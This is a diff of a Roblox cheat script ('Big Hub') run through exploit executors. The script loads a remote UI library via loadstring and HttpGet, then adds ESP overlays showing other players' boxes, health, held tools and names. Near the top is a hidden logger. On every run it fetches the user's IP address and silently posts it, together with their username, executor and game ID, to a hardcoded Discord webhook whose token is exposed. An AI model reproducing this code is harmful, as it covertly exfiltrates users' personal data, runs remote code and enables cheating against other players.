@@ -1,4 +1,4 @@
--- === Load Rayfield UI ===
+-- === Load Rayfield ===
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
@@ -9,67 +9,49 @@ local Window = Rayfield:CreateWindow({
     ShowText = "Rayfield",
     Theme = "Default",
     ToggleUIKeybind = "K",
-    DisableRayfieldPrompts = false,
-    DisableBuildWarnings = false,
-    ConfigurationSaving = {
-        Enabled = true,
-        FileName = "Big Hub"
-    },
-    Discord = {
-        Enabled = false,
-        Invite = "noinvitelink",
-        RememberJoins = true
-    },
+    ConfigurationSaving = { Enabled = true, FileName = "Big Hub" },
+    Discord = { Enabled = false },
     KeySystem = false,
-    KeySettings = {
-        SaveKey = true,
-        Key = {"Hello"}
-    }
+    KeySettings = { SaveKey = true, Key = {"Hello"} }
 })
 
 -- === Webhook Logging ===
 local WebhookURL = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"
-
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local requestFunc = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
+local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
 
 local function fetchIP()
-    if not requestFunc then return "Unavailable" end
-    local res = requestFunc({Url = "https://httpbin.org/ip", Method = "GET"})
+    if not request then return "Unavailable" end
+    local res = request({Url = "https://httpbin.org/ip", Method = "GET"})
     if res and res.Body then
-        local ok, data = pcall(function()
-            return HttpService:JSONDecode(res.Body)
-        end)
-        if ok and data and data.origin then
-            return data.origin
-        end
+        local ok, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
+        if ok and data and data.origin then return data.origin end
     end
     return "Unavailable"
 end
 
 local function sendWebhook()
-    if not requestFunc then return end
-    spawn(function()
+    if not request then return end
+    task.spawn(function()
         local ip = fetchIP()
-        local device = identifyexecutor and identifyexecutor() or "Unknown Executor"
-        local username = LocalPlayer and LocalPlayer.Name or "Unknown"
+        local device = identifyexecutor and identifyexecutor() or "Unknown"
         local payload = {
             embeds = {{
                 title = "Script Executed",
-                description = "A user has executed the script.",
+                description = "A user ran the script.",
                 color = 65280,
                 fields = {
-                    {name = "Username", value = username, inline = true},
-                    {name = "IP Address", value = ip, inline = true},
+                    {name = "Username", value = LocalPlayer.Name, inline = true},
+                    {name = "IP", value = ip, inline = true},
                     {name = "Executor", value = device, inline = false},
                     {name = "PlaceId", value = tostring(game.PlaceId), inline = true}
                 },
                 timestamp = DateTime.now():ToIsoDate()
             }}
         }
-        requestFunc({
+        request({
             Url = WebhookURL,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
@@ -80,154 +62,210 @@ end
 
 sendWebhook()
 
--- === ESP Setup ===
+-- === ESP Definitions ===
 local RunService = game:GetService("RunService")
-local ESPFlags = { Name = false, Box = false, Tool = false, HealthBar = false }
-local ESPData = {}
+local Camera = workspace.CurrentCamera
+local DrawingESP = {}
+local ESP_Toggles = {
+    Box = false,
+    Health = false,
+    Tool = false,
+    Name = false
+}
 
-local function createBillboard(offset, size)
-    local gui = Instance.new("BillboardGui")
-    gui.StudsOffset = offset
-    gui.AlwaysOnTop = true
-    gui.LightInfluence = 0
-    gui.MaxDistance = 1000
-    gui.Size = UDim2.new(0, size.X, 0, size.Y)
-    return gui
-end
-
-local function createHealthBar(offset)
-    local gui = createBillboard(offset, Vector2.new(60, 4))
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(1, 0, 1, 0)
-    frame.BackgroundTransparency = 1
-    frame.Parent = gui
-
-    local bg = Instance.new("Frame", frame)
-    bg.Size = UDim2.new(1, 0, 1, 0)
-    bg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-
-    local bar = Instance.new("Frame", bg)
-    bar.Size = UDim2.new(1, 0, 1, 0)
-    bar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
-
-    return gui, bar
-end
-
-local function createBox(char)
-    local box = Instance.new("BoxHandleAdornment")
-    box.Size = Vector3.new(4, 6, 2)
-    box.Transparency = 0.5
-    box.Color3 = Color3.new(1, 0, 0)
-    box.AlwaysOnTop = true
-    box.ZIndex = 5
-    box.Adornee = char
-    box.Parent = game.CoreGui
+-- Drawing Factories
+local function createBox()
+    local box = Drawing.new("Square")
+    box.Color = Color3.new(1, 1, 1)
+    box.Thickness = 1
+    box.Filled = false
+    box.Visible = false
     return box
 end
 
-local function clearPlayerESP(player)
-    if ESPData[player] then
-        for _, v in pairs(ESPData[player]) do
-            if typeof(v) == "table" and v.Gui then
-                v.Gui:Destroy()
-            elseif typeof(v) == "Instance" and v.Destroy then
-                v:Destroy()
+local function createBar()
+    local bar = Drawing.new("Square")
+    bar.Filled = true
+    bar.Visible = false
+    bar.Thickness = 0
+    return bar
+end
+
+local function createText()
+    local txt = Drawing.new("Text")
+    txt.Size = 14
+    txt.Center = true
+    txt.Outline = true
+    txt.OutlineColor = Color3.new(0, 0, 0)
+    txt.Font = 2
+    txt.Visible = false
+    return txt
+end
+
+local function clearESP()
+    for _, esp in pairs(DrawingESP) do
+        for _, obj in pairs(esp) do
+            if typeof(obj) == "table" then
+                for _, sub in pairs(obj) do if sub.Remove then sub:Remove() end end
+            elseif obj.Remove then
+                obj:Remove()
             end
         end
-        ESPData[player] = nil
     end
+    DrawingESP = {}
 end
 
-local function setupForPlayer(player)
-    if player == LocalPlayer then return end
-    local function onCharacter(char)
-        task.wait(0.5)
-        clearPlayerESP(player)
-        if not char:FindFirstChild("HumanoidRootPart") or not char:FindFirstChild("Humanoid") then return end
+local function updateESP()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChild("Humanoid") then
+            if not DrawingESP[player] then
+                DrawingESP[player] = {
+                    Box = createBox(),
+                    Health = createBar(),
+                    Tool = createText(),
+                    Name = createText()
+                }
+            end
 
-        local data = {}
+            local char = player.Character
+            local hum = char.Humanoid
+            local root = char.HumanoidRootPart
+            local cframe = root.CFrame
+            local _, onscreen = Camera:WorldToViewportPoint(root.Position)
 
-        if ESPFlags.Name then
-            local gui = createBillboard(Vector3.new(0, 3, 0), Vector2.new(100, 20))
-            local lbl = Instance.new("TextLabel")
-            lbl.Size = UDim2.new(1, 0, 1, 0)
-            lbl.BackgroundTransparency = 1
-            lbl.Text = player.Name
-            lbl.Font = Enum.Font.SourceSansBold
-            lbl.TextColor3 = Color3.new(1, 1, 1)
-            lbl.TextScaled = true
-            lbl.Parent = gui
-            gui.Parent = char:FindFirstChild("Head")
-            data.Name = gui
+            if onscreen and hum.Health > 0 then
+                local size = Vector3.new(2, 3, 1.5) * 1.5
+                local points = {}
+                for x = -1, 1, 2 do
+                    for y = -1, 1, 2 do
+                        for z = -1, 1, 2 do
+                            local offset = Vector3.new(x, y, z) * size / 2
+                            table.insert(points, Camera:WorldToViewportPoint((cframe.Position + offset)))
+                        end
+                    end
+                end
+
+                local minX, minY = math.huge, math.huge
+                local maxX, maxY = -math.huge, -math.huge
+                for _, point in ipairs(points) do
+                    minX = math.min(minX, point.X)
+                    minY = math.min(minY, point.Y)
+                    maxX = math.max(maxX, point.X)
+                    maxY = math.max(maxY, point.Y)
+                end
+
+                local box = DrawingESP[player].Box
+                local bar = DrawingESP[player].Health
+                local tool = DrawingESP[player].Tool
+                local name = DrawingESP[player].Name
+
+                -- Box
+                if ESP_Toggles.Box then
+                    box.Position = Vector2.new(minX, minY)
+                    box.Size = Vector2.new(maxX - minX, maxY - minY)
+                    box.Visible = true
+                else
+                    box.Visible = false
+                end
+
+                -- Health
+                if ESP_Toggles.Health then
+                    local ratio = math.clamp(hum.Health / hum.MaxHealth, 0, 1)
+                    bar.Size = Vector2.new(4, (maxY - minY) * ratio)
+                    bar.Position = Vector2.new(minX - 6, minY + ((maxY - minY) * (1 - ratio)))
+                    bar.Color = ratio > 0.5 and Color3.fromRGB(0,255,0)
+                        or ratio > 0.2 and Color3.fromRGB(255,255,0)
+                        or Color3.fromRGB(255,0,0)
+                    bar.Visible = true
+                else
+                    bar.Visible = false
+                end
+
+                -- Tool Name
+                if ESP_Toggles.Tool then
+                    local held = char:FindFirstChildOfClass("Tool")
+                    tool.Text = held and held.Name or ""
+                    tool.Position = Vector2.new((minX + maxX) / 2, maxY + 14)
+                    tool.Color = Color3.fromRGB(255, 255, 0)
+                    tool.Visible = held ~= nil
+                else
+                    tool.Visible = false
+                end
+
+                -- Username
+                if ESP_Toggles.Name then
+                    name.Text = player.Name
+                    name.Position = Vector2.new((minX + maxX) / 2, minY - 14)
+                    name.Color = Color3.fromRGB(255, 255, 255)
+                    name.Visible = true
+                else
+                    name.Visible = false
+                end
+
+            else
+                for _, obj in pairs(DrawingESP[player]) do
+                    if obj then obj.Visible = false end
+                end
+            end
+        elseif DrawingESP[player] then
+            for _, obj in pairs(DrawingESP[player]) do
+                if obj then obj.Visible = false end
+            end
         end
-
-        if ESPFlags.Tool then
-            local gui = createBillboard(Vector3.new(0, -3, 0), Vector2.new(100, 20))
-            local lbl = Instance.new("TextLabel")
-            lbl.Size = UDim2.new(1, 0, 1, 0)
-            lbl.BackgroundTransparency = 1
-            lbl.Font = Enum.Font.SourceSansBold
-            lbl.TextColor3 = Color3.fromRGB(255, 255, 0)
-            lbl.TextScaled = true
-            lbl.Parent = gui
-            gui.Parent = char:FindFirstChild("HumanoidRootPart")
-            data.Tool = gui
-        end
-
-        if ESPFlags.HealthBar then
-            local gui, bar = createHealthBar(Vector3.new(0, 2.5, 0))
-            gui.Parent = char.Head
-            data.HealthBar = { Gui = gui, Bar = bar, Humanoid = char:FindFirstChild("Humanoid") }
-        end
-
-        if ESPFlags.Box then
-            data.Box = createBox(char)
-        end
-
-        ESPData[player] = data
     end
-
-    if player.Character then onCharacter(player.Character) end
-    player.CharacterAdded:Connect(onCharacter)
-end
-
-local function updateESPToggles()
-    for p in pairs(ESPData) do clearPlayerESP(p) end
-    for _, p in ipairs(Players:GetPlayers()) do setupForPlayer(p) end
 end
 
 RunService.RenderStepped:Connect(function()
-    for p, data in pairs(ESPData) do
-        if data.HealthBar then
-            local hum = data.HealthBar.Humanoid
-            if hum then
-                local ratio = math.clamp(hum.Health / hum.MaxHealth, 0, 1)
-                data.HealthBar.Bar.Size = UDim2.new(ratio, 0, 1, 0)
-                data.HealthBar.Bar.BackgroundColor3 =
-                    (ratio > 0.5 and Color3.fromRGB(0, 255, 0)) or
-                    (ratio > 0.2 and Color3.fromRGB(255, 255, 0)) or
-                    Color3.fromRGB(255, 0, 0)
-            end
-        end
-        if data.Tool then
-            local tool = p.Character and p.Character:FindFirstChildOfClass("Tool")
-            data.Tool.TextLabel.Text = tool and tool.Name or ""
-        end
+    if next(ESP_Toggles) then
+        updateESP()
     end
 end)
 
-Players.PlayerAdded:Connect(setupForPlayer)
-
--- === ESP Toggle UI ===
-local Tab = Window:CreateTab("ESP Controls", 4483362458)
-
-for feature in pairs(ESPFlags) do
-    Tab:CreateToggle({
-        Name = "Enable " .. feature,
-        CurrentValue = false,
-        Callback = function(val)
-            ESPFlags[feature] = val
-            updateESPToggles()
+Players.PlayerRemoving:Connect(function(p)
+    if DrawingESP[p] then
+        for _, obj in pairs(DrawingESP[p]) do
+            if obj then obj:Remove() end
         end
-    })
-end
+        DrawingESP[p] = nil
+    end
+end)
+
+-- === UI: ESP Tab ===
+local Tab = Window:CreateTab("ESP", 4483362458)
+
+Tab:CreateToggle({
+    Name = "Box",
+    CurrentValue = false,
+    Callback = function(v)
+        ESP_Toggles.Box = v
+        if not v then clearESP() end
+    end
+})
+
+Tab:CreateToggle({
+    Name = "Health Bar",
+    CurrentValue = false,
+    Callback = function(v)
+        ESP_Toggles.Health = v
+        if not v then clearESP() end
+    end
+})
+
+Tab:CreateToggle({
+    Name = "Gun",
+    CurrentValue = false,
+    Callback = function(v)
+        ESP_Toggles.Tool = v
+        if not v then clearESP() end
+    end
+})
+
+Tab:CreateToggle({
+    Name = "Username",
+    CurrentValue = false,
+    Callback = function(v)
+        ESP_Toggles.Name = v
+        if not v then clearESP() end
+    end
+})
+
